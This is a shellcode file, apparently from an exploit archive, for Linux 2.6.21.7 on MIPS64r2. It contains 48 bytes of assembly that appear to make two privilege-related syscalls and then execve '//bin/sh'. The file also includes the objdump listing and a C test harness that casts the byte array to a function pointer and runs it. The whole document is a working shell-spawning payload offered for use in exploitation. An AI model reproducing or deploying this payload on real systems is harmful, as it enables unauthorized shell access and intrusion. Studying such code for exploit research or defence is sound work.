/* Title:  Linux-2.6.21.7/MIPS64r2 - execve /bin/sh - 48 bytes
   Author: nicephil nicephil@gmail.com
.text
.global __start
__start:
slti    $a0,$zero,-1
li      $v0,5102    
syscall 0x40404     
li      $v0,5103    
syscall 0x40404     
slti	$a2,$zero,-1
lui	$t8,0x2f2f
ori	$t8,$t8,0x6269
sw	$t8,-12($sp)
lui	$t8,0x6e2f
ori	$t8,$t8,0x7368
sw	$t8,-8($sp)
sw	$zero,-4($sp)
daddiu	$a0,$sp,-12
slti	$a1,$zero,-1
li	$v0,5057
syscall 0x40404
  
objdump:
2804ffff    slti    $a0,$zero,-1
24021333    li      $v0,5102    
0101010c    syscall 0x40404     
240213ef    li      $v0,5103    
0101010c    syscall 0x40404     
2806ffff 	slti	a2,zero,-1
3c182f2f 	lui	t8,0x2f2f
37186269 	ori	t8,t8,0x6269
afb8fff4 	sw	t8,-12(sp)
3c186e2f 	lui	t8,0x6e2f
37187368 	ori	t8,t8,0x7368
afb8fff8 	sw	t8,-8(sp)
afa0fffc 	sw	zero,-4(sp)
67a4fff4 	daddiu	a0,sp,-12
2805ffff 	slti	a1,zero,-1
240213c1 	li	v0,5057
0101010c 	syscall 0x40404
   
*/
 
#include <stdio.h>
 
 
char sc[] = { 
        "\x28\x04\xff\xff"        /* slti    $a0,$zero,-1  */
        "\x24\x02\x13\x33"        /* li      $v0,5102      */
        "\x01\x01\x01\x0c"        /* syscall 0x40404       */
        "\x24\x02\x13\xef"        /* li      $v0,5103      */
        "\x01\x01\x01\x0c"        /* syscall 0x40404       */
        "\x28\x06\xff\xff"        /* slti    $a2,$zero,-1   */
        "\x3c\x18\x2f\x2f"        /* lui     $t8,$0x2f2f    */
        "\x37\x18\x62\x69"        /* ori     $t8,$t8,$0x6269 */
        "\xaf\xb8\xff\xf4"        /* sw      $t8,-12($sp)   */
        "\x3c\x18\x6e\x2f"        /* lui     $t8,0x6e2f    */
        "\x37\x18\x73\x68"        /* ori     $t8,$t8,0x7368 */
        "\xaf\xb8\xff\xf8"        /* sw      $t8,-8($sp)    */
        "\xaf\xa0\xff\xfc"        /* sw      $zero,-4($sp)  */
        "\x67\xa4\xff\xf4"        /* addiu   $a0,$sp,-12    */
        "\x28\x05\xff\xff"        /* slti    $a1,$zero,-1   */
        "\x24\x02\x13\xc1"        /* li      $v0,5057      */
        "\x01\x01\x01\x0c"        /* syscall 0x40404        */
};
 
void main(void)
{
       void(*s)(void);
       printf("size: %d\n", strlen(sc));
       s = sc;
       s();
}






